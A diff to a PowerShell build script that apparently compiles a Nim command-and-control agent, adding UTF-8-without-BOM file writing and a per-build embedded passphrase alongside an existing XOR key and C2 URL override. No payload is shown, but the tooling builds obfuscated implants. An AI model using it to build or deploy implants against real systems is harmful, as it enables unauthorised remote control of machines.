@@ -47,11 +47,20 @@ param(
 $ErrorActionPreference = "Stop"
 $PSNativeCommandUseErrorActionPreference = $true
 
+function Write-Utf8NoBom {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path,
+        [Parameter(Mandatory = $true)][string]$Content
+    )
+    [System.IO.File]::WriteAllText($Path, $Content, (New-Object System.Text.UTF8Encoding($false)))
+}
+
 $ProjectDir = $PSScriptRoot
 $BuildDir = if ($OutputDir) { $OutputDir } else { Join-Path $ProjectDir "build" }
 $SrcDir = $ProjectDir
 $Nim = if ($env:NIM) { $env:NIM } else { "nim" }
 $OverrideFile = Join-Path $ProjectDir "c2_override.nim"
+$SecretFile = Join-Path $ProjectDir "secret.nim"
 
 # ---- 1. Verify toolchain -----------------------------------------------
 if (-not (Get-Command $Nim -ErrorAction SilentlyContinue)) {
@@ -109,7 +118,7 @@ $OverrideContent = @"
 const C2_DEPLOY_URL* = "$C2Url"
 $CertPemLiteral
 "@
-Set-Content -Path $OverrideFile -Value $OverrideContent -Encoding UTF8 -NoNewline
+Write-Utf8NoBom -Path $OverrideFile -Content $OverrideContent
 Write-Host ('[*] Generated ' + $OverrideFile) -ForegroundColor Gray
 
 # ---- 5. Build flags ----------------------------------------------------
@@ -161,7 +170,16 @@ $hexParts = @()
 foreach ($b in $keyBytes) { $hexParts += ("0x{0:x2}" -f $b) }
 $keyBody = $hexParts -join ", "
 $xorKeyContent = "# Auto-generated per-build XOR key. Do NOT edit.`nconst XorKey: array[32, byte] = [byte $keyBody]`n"
-Set-Content -Path $XorKeyPath -Value $xorKeyContent -Encoding UTF8 -NoNewline
+Write-Utf8NoBom -Path $XorKeyPath -Content $xorKeyContent
+if ($env:C2_AGENT_PASSPHRASE -and $env:C2_AGENT_PASSPHRASE -ne "") {
+    $passphrase = $env:C2_AGENT_PASSPHRASE
+} else {
+    $secretBytes = New-Object byte[] 32
+    $rng.GetBytes($secretBytes)
+    $passphrase = -join ($secretBytes | ForEach-Object { '{0:x2}' -f $_ })
+}
+$escapedPassphrase = $passphrase.Replace('\', '\\').Replace('"', '\"')
+Write-Utf8NoBom -Path $SecretFile -Content "const SECRET_PLAINTEXT* = `"$escapedPassphrase`"`n"
 
 # ---- 7. Compile --------------------------------------------------------
 Write-Host ('[*] Building ' + $OutName + ' (variant=' + $Variant + ') ...') -ForegroundColor Cyan
@@ -176,12 +194,14 @@ $ErrorActionPreference = $prevEAP
 if ($LASTEXITCODE -ne 0) {
     Write-Warning "Build failed (exit $LASTEXITCODE)"
     if (Test-Path $XorKeyPath) { Move-Item $XorKeyPath -Destination "$env:TEMP\xorkey.nim" -Force }
+    if (Test-Path $SecretFile) { Move-Item $SecretFile -Destination "$env:TEMP\secret.nim" -Force }
     if (Test-Path $OverrideFile) { Move-Item $OverrideFile -Destination "$env:TEMP\c2_override.nim" -Force }
     exit $LASTEXITCODE
 }
 
 # Move per-build artifacts out of the source tree (keep repo clean)
 if (Test-Path $XorKeyPath) { Move-Item $XorKeyPath -Destination "$env:TEMP\xorkey_$(Get-Random).nim" -Force }
+if (Test-Path $SecretFile) { Move-Item $SecretFile -Destination "$env:TEMP\secret_$(Get-Random).nim" -Force }
 if (Test-Path $OverrideFile) { Move-Item $OverrideFile -Destination "$env:TEMP\c2_override_$(Get-Random).nim" -Force }
 
 # ---- 8. Verify --------------------------------------------------------
